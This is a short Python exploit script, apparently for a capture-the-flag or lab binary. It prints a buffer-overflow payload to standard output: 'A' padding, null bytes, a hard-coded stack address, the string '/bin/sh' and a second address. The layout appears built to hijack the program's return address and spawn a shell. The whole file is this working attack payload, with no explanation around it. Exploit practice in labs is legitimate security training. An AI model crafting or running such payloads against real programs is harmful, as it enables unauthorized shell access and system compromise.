#!/usr/bin/env python3

import sys

sys.stdout.buffer.write(b'A'*10)
sys.stdout.buffer.write(b'\x00'*16)
sys.stdout.buffer.write(0x7ffffff695c0.to_bytes(8,'little'))
sys.stdout.buffer.write(b'/bin/sh\x00')
sys.stdout.buffer.write(0x455050.to_bytes(8,'little'))